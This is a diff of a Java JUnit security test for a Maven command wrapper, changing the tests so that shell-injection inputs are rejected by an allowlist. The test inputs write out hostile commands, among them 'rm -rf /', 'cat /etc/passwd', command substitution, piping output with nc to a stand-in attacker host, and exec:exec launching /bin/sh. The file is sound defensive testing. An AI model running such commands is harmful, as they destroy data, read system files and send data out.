@@ -8,60 +8,74 @@ import org.junit.jupiter.api.io.TempDir;
 import java.nio.file.Path;
 
 import static org.assertj.core.api.Assertions.assertThat;
+import static org.assertj.core.api.Assertions.assertThatIllegalArgumentException;
 
 @DisplayName("Security and adversarial tests")
 class MavenSecurityTest {
 
     private final MavenService service = new MavenService();
-    private static final String MAVEN_HOME = "/opt/maven";
+    private static final String MAVEN_HOME = TestUtils.resolveMavenHome();
 
     @TempDir
     Path tempDir;
 
     @Nested
-    @DisplayName("Command injection via getCommands()")
+    @DisplayName("Command injection via getCommands() — now blocked by allowlist")
     class CommandInjectionGetCommands {
 
         @Test
-        @DisplayName("shell command chaining with &&")
+        @DisplayName("shell command chaining with && is rejected")
         void shellChainingWithDoubleAmpersand() {
-            String[] result = MavenInvoker.getCommands("mvn clean && rm -rf /");
-            assertThat(result).contains("&&", "rm");
+            assertThatIllegalArgumentException()
+                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean && rm -rf /"))
+                    .withMessageContaining("Command not allowed");
         }
 
         @Test
-        @DisplayName("shell command chaining with semicolon")
+        @DisplayName("shell command chaining with semicolon is rejected")
         void shellChainingWithSemicolon() {
-            String[] result = MavenInvoker.getCommands("mvn clean ; cat /etc/passwd");
-            assertThat(result).contains(";", "cat");
+            assertThatIllegalArgumentException()
+                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean ; cat /etc/passwd"))
+                    .withMessageContaining("Command not allowed");
         }
 
         @Test
-        @DisplayName("shell command substitution with backticks")
+        @DisplayName("shell command substitution with backticks is rejected")
         void shellCommandSubstitutionBackticks() {
-            String[] result = MavenInvoker.getCommands("mvn clean `touch /tmp/pwned`");
-            assertThat(result).contains("`touch");
+            assertThatIllegalArgumentException()
+                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean `touch /tmp/pwned`"))
+                    .withMessageContaining("Command not allowed");
         }
 
         @Test
-        @DisplayName("shell command substitution with dollar-paren")
+        @DisplayName("shell command substitution with dollar-paren is rejected")
         void shellCommandSubstitutionDollarParen() {
-            String[] result = MavenInvoker.getCommands("mvn clean $(cat /etc/passwd)");
-            assertThat(result).contains("$(cat");
+            assertThatIllegalArgumentException()
+                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean $(cat /etc/passwd)"))
+                    .withMessageContaining("Command not allowed");
         }
 
         @Test
-        @DisplayName("pipe injection attempt")
+        @DisplayName("pipe injection attempt is rejected")
         void pipeInjection() {
-            String[] result = MavenInvoker.getCommands("mvn clean | nc attacker.com 4444");
-            assertThat(result).contains("|", "nc");
+            assertThatIllegalArgumentException()
+                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean | nc attacker.com 4444"))
+                    .withMessageContaining("Command not allowed");
         }
 
         @Test
-        @DisplayName("exec:exec plugin bypass attempt")
+        @DisplayName("exec:exec plugin is blocked")
         void execExecBypass() {
-            String[] result = MavenInvoker.getCommands("mvn exec:exec -Dexec.executable=/bin/sh");
-            assertThat(result).contains("exec:exec");
+            assertThatIllegalArgumentException()
+                    .isThrownBy(() -> MavenInvoker.getCommands("mvn exec:exec -Dexec.executable=/bin/sh"))
+                    .withMessageContaining("Blocked plugin goal");
+        }
+
+        @Test
+        @DisplayName("legitimate commands with safe flags pass allowlist")
+        void legitimateCommandsPass() {
+            String[] result = MavenInvoker.getCommands("mvn clean install -DskipTests");
+            assertThat(result).containsExactly("clean", "install", "-DskipTests");
         }
     }
 
@@ -76,7 +90,8 @@ class MavenSecurityTest {
             try {
                 service.executeCommand(MAVEN_HOME, traversal.toString(), "clean");
             } catch (IllegalArgumentException e) {
-                assertThat(e.getMessage()).contains("does not exist");
+                assertThat(e.getMessage())
+                        .containsAnyOf("does not exist", "Cannot resolve project directory");
             }
         }
     }
@@ -93,10 +108,11 @@ class MavenSecurityTest {
         }
 
         @Test
-        @DisplayName("zero-width characters in command")
+        @DisplayName("zero-width characters in command are rejected")
         void zeroWidthCharacters() {
-            String[] result = MavenInvoker.getCommands("mvn cle\u200Ban\u200B");
-            assertThat(result[0]).isEqualTo("cle\u200Ban\u200B");
+            assertThatIllegalArgumentException()
+                    .isThrownBy(() -> MavenInvoker.getCommands("mvn cle\u200Ban\u200B"))
+                    .withMessageContaining("Command not allowed");
         }
     }
 
@@ -105,7 +121,7 @@ class MavenSecurityTest {
     class LongInputAttacks {
 
         @Test
-        @DisplayName("very long command does not crash")
+        @DisplayName("very long command does not crash (allowed tokens)")
         void veryLongCommand() {
             StringBuilder sb = new StringBuilder("mvn");
             for (int i = 0; i < 10000; i++) {
@@ -125,7 +141,8 @@ class MavenSecurityTest {
             try {
                 service.executeCommand(sb.toString(), tempDir.toString(), "clean");
             } catch (IllegalArgumentException e) {
-                assertThat(e.getMessage()).contains("Invalid maven home directory");
+                assertThat(e.getMessage())
+                        .containsAnyOf("Invalid maven home directory", "Cannot resolve maven home path");
             }
         }
     }
@@ -141,7 +158,7 @@ class MavenSecurityTest {
                 service.executeCommand("/nonexistent/path", tempDir.toString(), "clean");
                 throw new AssertionError("Should have thrown");
             } catch (IllegalArgumentException e) {
-                assertThat(e.getMessage()).contains("Invalid maven home directory");
+                assertThat(e.getMessage()).containsAnyOf("Invalid maven home directory", "Cannot resolve");
             }
         }
 
@@ -152,7 +169,8 @@ class MavenSecurityTest {
                 service.executeCommand(MAVEN_HOME, "/nonexistent/project", "clean");
                 throw new AssertionError("Should have thrown");
             } catch (IllegalArgumentException e) {
-                assertThat(e.getMessage()).contains("does not exist");
+                assertThat(e.getMessage())
+                        .containsAnyOf("does not exist", "Cannot resolve project directory");
             }
         }
 
@@ -179,10 +197,11 @@ class MavenSecurityTest {
         }
 
         @Test
-        @DisplayName("getCommands does NOT sanitize shell metacharacters")
-        void getCommandsDoesNotSanitizeShellMetacharacters() {
-            String[] result = MavenInvoker.getCommands("mvn clean && rm -rf /");
-            assertThat(result).contains("&&", "rm");
+        @DisplayName("getCommands now sanitizes and rejects shell metacharacters")
+        void getCommandsNowSanitizesShellMetacharacters() {
+            assertThatIllegalArgumentException()
+                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean && rm -rf /"))
+                    .withMessageContaining("Command not allowed");
         }
     }
 }
